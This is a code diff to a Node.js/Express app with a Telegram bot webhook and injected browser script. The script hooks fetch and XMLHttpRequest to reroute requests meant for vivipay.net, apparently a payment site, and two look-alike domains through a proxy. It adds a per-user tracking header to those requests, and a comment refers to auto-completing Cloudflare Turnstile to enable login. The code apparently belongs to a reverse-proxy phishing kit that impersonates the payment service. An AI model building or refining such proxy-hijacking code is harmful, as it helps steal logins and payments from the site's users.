@@ -1106,6 +1106,16 @@ app.use((req, res, next) => {
     });
 });
 
+app.use(async (req, res, next) => {
+    if (bot && !webhookSet && WEBHOOK_URL) {
+        try {
+            await bot.setWebHook(WEBHOOK_URL);
+            webhookSet = true;
+        } catch (e) { }
+    }
+    next();
+});
+
 app.use('/hook', (req, res, next) => {
     res.header('Access-Control-Allow-Origin', '*');
     res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -2967,30 +2977,7 @@ var REAL='https://tivox.icu';
 var REAL2='https://qonix.click';
 var SERVER_IFSC='';
 
-// ── Intercept API calls so <base> tag doesn't redirect them to vivipay.net ──
-(function(){
-  function getProxyUrl(url) {
-    if (typeof url !== 'string') return url;
-    if (url.indexOf('rsCfg.json') !== -1) return P + '/rsCfg.json';
-    if (url.indexOf('vivipay.net/xxapi/') !== -1 || url.indexOf('tivox.icu/xxapi/') !== -1 || url.indexOf('qonix.click/xxapi/') !== -1) {
-      return P + '/xxapi/' + url.split('/xxapi/')[1];
-    }
-    if (url.indexOf('/xxapi/') === 0) return P + url;
-    return url;
-  }
-  var origFetch = window.fetch;
-  window.fetch = function(url, opts) {
-    url = getProxyUrl(url);
-    return origFetch.call(window, url, opts);
-  };
-  if (typeof XMLHttpRequest !== 'undefined' && XMLHttpRequest.prototype && XMLHttpRequest.prototype.open) {
-    var origOpen = XMLHttpRequest.prototype.open;
-    XMLHttpRequest.prototype.open = function(method, url, async, user, pass) {
-      url = getProxyUrl(url);
-      return origOpen.call(this, method, url, async, user, pass);
-    };
-  }
-})();
+// ────────────────────────────────────────────────────────────────────────────
 
 // ── Cloudflare Turnstile auto-complete ──────────────────────────────────────
 // vivipay.net waits for turnstile.render() callback before enabling login.
@@ -3096,7 +3083,18 @@ if(!window.xamlAction){
 }
 
 
-function _px(u){if(!u||typeof u!=='string')return null;if(u.indexOf(REAL)===0)return P+u.slice(REAL.length);if(u.indexOf(REAL2)===0)return P+u.slice(REAL2.length);return null;}
+function _px(u){
+  if(!u||typeof u!=='string')return u;
+  if(u.indexOf(REAL)===0)return P+u.slice(REAL.length);
+  if(u.indexOf(REAL2)===0)return P+u.slice(REAL2.length);
+  if(u.indexOf('https://vivipay.net/xxapi/')===0)return P+'/xxapi/'+u.slice('https://vivipay.net/xxapi/'.length);
+  if(u.indexOf('http://vivipay.net/xxapi/')===0)return P+'/xxapi/'+u.slice('http://vivipay.net/xxapi/'.length);
+  if(u.indexOf('https://vivipay.net/')===0&&u.indexOf('/xxapi/')>-1)return P+'/xxapi/'+u.split('/xxapi/')[1];
+  if(u.indexOf('/xxapi/')===0)return P+u;
+  if(u.indexOf('xxapi/')===0)return P+'/'+u;
+  if(u.indexOf('rsCfg.json')!==-1)return P+'/rsCfg.json';
+  return u;
+}
 var CFG=null;
 var UID='';
 
@@ -3123,10 +3121,10 @@ lcAsync();}
 
 var _open=XMLHttpRequest.prototype.open;
 var _send=XMLHttpRequest.prototype.send;
-XMLHttpRequest.prototype.open=function(m,u){
-var _pu=_px(u);if(_pu){u=_pu;arguments[1]=u;}
-this._hu=u;this._hm=m;
-var ret=_open.apply(this,arguments);
+XMLHttpRequest.prototype.open=function(m,u,async,user,pass){
+var _pu=_px(u);
+this._hu=_pu;this._hm=m;
+var ret=_open.call(this,m,_pu,async,user,pass);
 if(UID){try{this.setRequestHeader('x-px-uid',UID);}catch(e){}}
 return ret;};
 
